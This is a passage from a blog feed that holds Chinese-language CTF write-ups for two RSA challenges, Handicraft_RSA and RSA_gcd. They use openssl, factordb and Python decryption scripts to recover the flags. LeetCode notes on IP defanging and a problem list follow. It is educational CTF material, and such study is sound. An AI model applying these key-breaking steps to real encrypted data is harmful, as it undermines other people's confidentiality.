4ce7df8a546e48206febc3a8c7303b617e2d75f16de9e7455606b7d7d9c4913e6950a41c0d5a4e0d17db3cfb0efff42017d26501878c9abe37a8cfed37267ea79ab00e82fbedf4c9a0930dccee32e6073aae40ec3a3109598e4ec9e74ca4b495d535d95291acdbe5d730c5fe8f59381953c59d244c1d5476006af76037b77df7921d22d9984869e3239539b7e8236eace6342a7c46622aa0f887f4adc2b002244f8a005ab4d28b6f6f437d40d067a67867c6e091907c19c9c74ebafd25e5201e41cd4e8cc8f8ebd8d57657c9f83b481fa6ecd4d016a76ade47312580816936c73dd5f2f51f131a5e632e98a27df908b6b3d4faec65cf21f4e73454663bfd2d7993447e40304c247932bc80c0d96df72d93a677016bf36741</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Handicraft_RSA</title>
    <url>/2020/10/14/Handicraft-RSA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=1&id=4981&page=3">题目地址</a></p>
<p>题目名称：Handicraft_RSA</p>
<p>题目描述：</p>
<p>有人正在他老房子的地下室里开发自己的RSA系统。证明他这个RSA系统只在他的地下室有效。</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/f5346507773f4b909479387d59a01710">附件1</a></p>
<a id="more"></a>

<p>WriteUp</p>
<p><strong>解题过程：</strong></p>
<p>下载附件，先用010Editor打开查看16进制，也没看出是什么文件，也没有有含义的字符串</p>
<p>打开kaili虚拟机，用linux的file命令查看文件类型，发现是XZ压缩方式</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014112757615.png" alt="image-20201014112757615"></p>
<p>也是第一次接触到xz压缩，百度搜索解压方式</p>
<p>1、首先使用xz解压文件</p>
<p>先给文件加上.xz后缀，否则会解压失败，然后加压</p>
<p>命令：<code>xz -d f5346507773f4b909479387d59a01710.xz</code></p>
<p>注：使用 xz 进行压缩和解压过程中都会直接在原文件上进行，比如说对 tar.xz 解压后直接就剩下 tar 了，而没有了原 tar.xz 文件。可以加 -k 参数（keep）进行保留原文件</p>
<p>xz解压后就变成了tar压缩文件，继续解压得到了handicraft_rsa文件夹</p>
<p>命令：<code>tar -xvf f5346507773f4b909479387d59a01710</code></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014113556444.png" alt="image-20201014113556444"></p>
<p>2、拷贝到win10中接着进行分析</p>
<p>文件夹中有两个文件，output.txt文件是handicraft_rsa.py文件输出的结果</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014113739458.png" alt="image-20201014113739458"></p>
<p>handicraft_rsa.py文件内容及分析过程如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> s, FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment">#题目所给的python文件使用的是python2，与python3语法、函数有些许不同</span></span><br><span class="line"><span class="comment">#得到一个1024bit的质数,不理解函数体也没关系，用于分析s的数值，大致猜出s不会太大</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="comment">#getPrime(s)返回一个随机N-Bit的质数</span></span><br><span class="line">        r = getPrime(s)</span><br><span class="line">        R = [r]</span><br><span class="line">        t = int(<span class="number">5</span> * s / <span class="number">2</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, t):</span><br><span class="line">			<span class="comment">#getRandomRange(a,b)函数得到一个在[a,b)之间的random</span></span><br><span class="line">            R.append(r + getRandomRange(<span class="number">0</span>, <span class="number">4</span> * s ** <span class="number">2</span>))</span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		lambda作为一个表达式，定义了一个匿名函数，a,b为函数传参，a*b为函数体</span></span><br><span class="line"><span class="string">		reduce(function,iterable[,initializer]) 函数会对参数序列中元素进行累积。</span></span><br><span class="line"><span class="string">		也就是对iterable可迭代对象（如列表、元组）中的第1、2个元素进行函数操作，</span></span><br><span class="line"><span class="string">		将得到的结果与第三个元素用function运算，最后得到一个结果，如果有init参数，</span></span><br><span class="line"><span class="string">		则先将init与第一个元素进行运算</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span></span><br><span class="line">        p = reduce(<span class="keyword">lambda</span> a, b: a * b, R, <span class="number">2</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">if</span> len(bin(p)[<span class="number">2</span>:]) == <span class="number">1024</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环，直到得到2048bit的n</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = gen_prime(s)</span><br><span class="line">    q = gen_prime(s)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = inverse(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    <span class="keyword">if</span> len(bin(n)[<span class="number">2</span>:]) == <span class="number">2048</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">msg = FLAG</span><br><span class="line">key = RSA.construct((long(n), long(e), long(d), long(p), long(p)))</span><br><span class="line"><span class="comment">#循环，加密s次</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(s):</span><br><span class="line">	<span class="comment">#RSA加密得到密文</span></span><br><span class="line">    enc = key.encrypt(msg, <span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line">    msg = enc</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印公钥文件</span></span><br><span class="line"><span class="keyword">print</span> key.publickey().exportKey()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;-&#x27;</span> * <span class="number">76</span></span><br><span class="line"><span class="comment">#密文用base64加密然后打印出来，这是python2的写法</span></span><br><span class="line"><span class="keyword">print</span> enc.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;-&#x27;</span> * <span class="number">76</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>output.txt文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ</span><br><span class="line">71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXs</span><br><span class="line">z9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsds</span><br><span class="line">etnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpD</span><br><span class="line">ffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+</span><br><span class="line">7&#x2F;i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAA</span><br><span class="line">AQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">eER0JNIcZYx&#x2F;t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL&#x2F;wnHtkAoNdCalQkpcbnZeAz4qeMX</span><br><span class="line">5GBmsO+BXyAKDueMA4uy3fw2k&#x2F;dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS4</span><br><span class="line">2o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI&#x2F;jUA2BEo5WBoPzsCzwRmdr6QmJXTsau</span><br><span class="line">5BAQC5qdIkmCNq7+NLY1fjOmSEF&#x2F;W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnX</span><br><span class="line">sh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上半部分是RSA加密公钥，下半部分是base64编码后的base64</p>
<p>接下来就简单了，把公钥信息保存成public.key文件，然后在kali虚拟机里用openssl工具解出e、n</p>
<p>命令：<code>openssl rsa -pubin -text -modulus -in warmup -in public.key</code></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014114703386.png" alt="image-20201014114703386"></p>
<p>得到e、n，把n转成10进制然后在网站<a href="http://factordb.com/,%E8%A7%A3%E5%87%BAp%E5%92%8Cq">http://factordb.com/,解出p和q</a></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014115059462.png" alt="image-20201014115059462"></p>
<p>到此，已经获取到RSA的全部参数p、q、n、e</p>
<p>3、使用python3脚本解出明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p=<span class="number">139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">q = <span class="number">155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001</span> </span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">&#x27;eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==&#x27;</span></span><br><span class="line">c=base64.b64decode(enc).hex()<span class="comment">#base64解码后是bytes类型，转成16进制字符串</span></span><br><span class="line"><span class="comment"># with open(r&quot;E:/flag.enc&quot; , &quot;rb&quot;) as f:</span></span><br><span class="line">    <span class="comment"># s=f.read().hex()#bytes转16进制字符串</span></span><br><span class="line">c=int(c,<span class="number">16</span>);<span class="comment">#密文，16进制转成int型</span></span><br><span class="line"><span class="comment">#这里不知道循环次数s的数值，不过根据分析s不会太大</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#解出明文</span></span><br><span class="line">    m=pow(c,d,n)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">    c=m</span><br><span class="line">    hex_data=hex(m)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;666c&#x27;</span> <span class="keyword">in</span> hex_data:</span><br><span class="line">        print(hex_data)<span class="comment">#输出16进制数据</span></span><br><span class="line">        <span class="comment">#因为base16编码后的字母组成是[0-9A-F],所以要转成大写，否则会提示“Non-base16 digit found”</span></span><br><span class="line">        <span class="comment">#还可以写成flag=base64.b16decode(hex[2:],True)或者修改python库base64源码里的b16decode()函数第二个参数为True</span></span><br><span class="line">        flag=base64.b16decode(hex_data[<span class="number">2</span>:].upper())</span><br><span class="line">        print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>运行代码得到flag：ASIS{n0t_5O_e4sy___RSA___in_ASIS!!!}</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014120104049.png" alt="image-20201014120104049"></p>
<p>中间有的步骤还有其它方法</p>
<p>可以参考我的另一篇RSA WriteUp  <a href="https://z2bns.github.io/2020/10/10/RSA256/">RSA256</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址无效化</title>
    <url>/2020/11/07/IP%E5%9C%B0%E5%9D%80%E6%97%A0%E6%95%88%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/defanging-an-ip-address/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个有效的 IPv4 地址 <code>address</code>，返回这个 IP 地址的无效化版本。</p>
<p>所谓无效化 IP 地址，其实就是用 <code>&quot;[.]&quot;</code> 代替了每个~。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：address &#x3D; &quot;1.1.1.1&quot;</span><br><span class="line">输出：&quot;1[.]1[.]1[.]1&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：address &#x3D; &quot;255.100.50.0&quot;</span><br><span class="line">输出：&quot;255[.]100[.]50[.]0&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>给出的 <code>address</code> 是一个有效的 IPv4 地址</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>方法1：获取每个.之前的部分，转换后拼接到result中，在address中删掉转换后的这部分。</p>
<p>方法2：遍历address，对.元素进行替换处理</p>
<p><strong>c++代码1：</strong>(执行用时4ms，击败19.17%，内存消耗6.4M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//.的位置</span></span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="comment">//存储最后结果</span></span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>((n=address.find(<span class="string">&#x27;.&#x27;</span>))!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            <span class="comment">//获取.之前的子串并把.替换为[.]加到result中</span></span><br><span class="line">            result+=address.substr(<span class="number">0</span>,n+<span class="number">1</span>).replace(n,<span class="number">1</span>,<span class="string">&quot;[.]&quot;</span>);</span><br><span class="line">            address.erase(<span class="number">0</span>,n+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//加上最后一个.后的值</span></span><br><span class="line">        result+=address;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>c++代码2：</strong>（执行用时4ms，击败19.17%，内存消耗6.2M，击败5.33%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//遍历address，对.进行替换</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;address.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(address[i]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                address.replace(i,<span class="number">1</span>,<span class="string">&quot;[.]&quot;</span>);</span><br><span class="line">                i+=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p>优先级：算术运算符 &gt; 关系运算符 &gt; 赋值运算</p>
<p><code>while((n=address.find(&#39;.&#39;))!=string::npos)</code>，前面n的复制运算要加上括号。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>只想着用STL 中string的方法了，其实方法二代码比较清晰简洁，做的时候感觉遍历效率不高，其实还行。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA_gcd</title>
    <url>/2020/10/13/RSA-gcd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=1&id=5452&page=2">题目地址</a></p>
<p>题目名称：RSA_gcd</p>
<p>题目描述：暂无</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/f1217fd42e8b43558077180e98c757d7.zip">附件1</a></p>
<a id="more"></a>

<p><strong>解题思路：</strong></p>
<p>下载附件，解压得到两个文件</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013093744652.png" alt="image-20201013093744652"></p>
<p>文件内容如下：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013093813299.png" alt="image-20201013093813299"></p>
<p>给出了模数n、公钥指数e、密文c，就是常规的RSA解密，属于常规破解模数，直接用脚本解密就好了。</p>
<p><strong>解题过程：</strong></p>
<p>登录网站<a href="http://factordb.com/,%E5%88%86%E5%88%AB%E8%A7%A3%E5%87%BAp%E5%92%8Cq%EF%BC%8C%E5%A6%82%E4%B8%8B">http://factordb.com/,分别解出p和q，如下</a></p>
<p>attach1.txt：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094252764.png" alt="image-20201013094252764"></p>
<p>attach2.txt：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094215298.png" alt="image-20201013094215298"></p>
<p>python3脚本解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p1 = <span class="number">138376604533530412400239558340424700312412702699022481119357799054715877829291635290832719835033140580690053865677079316241919169166375123691917675235979462772103681398725285808551041924624882840901583892858174270714471366531758975241868470938138238307005782651296179579961869801841395682782645916848523771439</span></span><br><span class="line">q1 = <span class="number">167807411649676462546661119644113081915542378755778327057156191284453150887662343414908916953154897183613548083558919410359642450001343644814021159828724844730881111955050992398535063409828169462180970629537792676998647880110463527555034040871485964361418080481113059959410616446772218038141157051007091689351</span> </span><br><span class="line">n1 = p1*q1</span><br><span class="line"></span><br><span class="line">p2=  <span class="number">138376604533530412400239558340424700312412702699022481119357799054715877829291635290832719835033140580690053865677079316241919169166375123691917675235979462772103681398725285808551041924624882840901583892858174270714471366531758975241868470938138238307005782651296179579961869801841395682782645916848523771439</span></span><br><span class="line">q2=  <span class="number">163631266233712837481823088378337134151021871060275887871338250274359922218053543333532579728777813509956261662615493179160669715503833949420308311581736674332268131534602581626817039237393599222688271607325131529790640375765697832746614700483681658911753936520482383592478743093233261371451718844275762094649</span></span><br><span class="line">n2=p2*q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d1=modinv(e,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line">d2=modinv(e,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">9700614748413503291260966231863562117502096284616216707445276355274869086619796527618473213422509996843430296526594113572675840559345077344419098900818709577642324900405582499683604786981144099878021784567540654040833912063141709913653416394888766281465200682852378794478801329251224801006820925858507273130504236563822120838520746270280731121442839412258397191963036040553539697846535038841541209050503061001070909725806574230090246041891486506980939294245537252610944799573920844235221096956391095716111629998594075762507345430945523492775915790828078000453705320783486744734994213028476446922815870053311973844961</span></span><br><span class="line">c2=<span class="number">20513108670823938405207629835395350087127287494963553421797351726233221750526355985253069487753150978011340115173042210284965521215128799369083065796356395285905154260709263197195828765397189267866348946188652752076472172155755940282615212228370367042435203584159326078238921502151083768908742480756781277358357734545694917591921150127540286087770229112383605858821811640935475859936319249757754722093551370392083736485637225052738864742947137890363135709796410008845576985297696922681043649916650599349320818901512835007050425460872675857974069927846620905981374869166202896905600343223640296138423898703137236463508</span></span><br><span class="line"><span class="comment">#解出明文</span></span><br><span class="line">m1=pow(c1,d1,n1)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">m2=pow(c2,d2,n2)<span class="comment">#得到的是10进制数据</span></span><br><span class="line"></span><br><span class="line">hex1=hex(m1)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">hex2=hex(m2)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">hex=hex1+hex2[<span class="number">2</span>:]</span><br><span class="line">print(hex)<span class="comment">#输出16进制数据</span></span><br><span class="line">flag=base64.b16decode(hex[<span class="number">2</span>:].upper())</span><br><span class="line">print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解密结果：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094534794.png" alt="image-20201013094534794"></p>
<p>得到flag{336BB5172ADE227FE68BAA44FDA73F3B}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题目</title>
    <url>/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文给出了LeetCode上面一些题目，空闲时可以思考一下</p>
<a id="more"></a>
<p>1、<a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/">访问所有点的最小时间</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113045478.png" alt="image-20201109113045478"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113054739.png" alt="image-20201109113054739"></p>
<p>2、<a href="https://leetcode-cn.com/problems/sum-of-all-odd-length-subarrays/">所有奇数长度子数组的和</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113109571.png" alt="image-20201109113109571"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113146870.png" alt="image-20201109113146870"></p>
<p>3、<a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">能否连接形成数组</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113205759.png" alt="image-20201109113205759"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113213446.png" alt="image-20201109113213446"></p>
<p>4、<a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/">统计位数为偶数的数字</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113226501.png" alt="image-20201109113226501"></p>
<p>5、<a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/">矩阵对角线元素的和</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113241596.png" alt="image-20201109113241596"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113250018.png" alt="image-20201109113250018"></p>
<p>6、<a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/">1290. 二进制链表转整数</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153040964.png" alt="image-20201109153040964"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153048611.png" alt="image-20201109153048611"></p>
<p>7、<a href="https://leetcode-cn.com/problems/number-of-students-doing-homework-at-a-given-time/"> 在既定时间做作业的学生人数</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153157974.png" alt="image-20201109153157974"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153205971.png" alt="image-20201109153205971"></p>
<p>8、<a href="https://leetcode-cn.com/problems/nGK0Fy/">速算机器人</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153222234.png" alt="image-20201109153222234"></p>
<p>9、<a href="https://leetcode-cn.com/problems/duplicate-emails/">查找重复的电子邮箱</a></p>
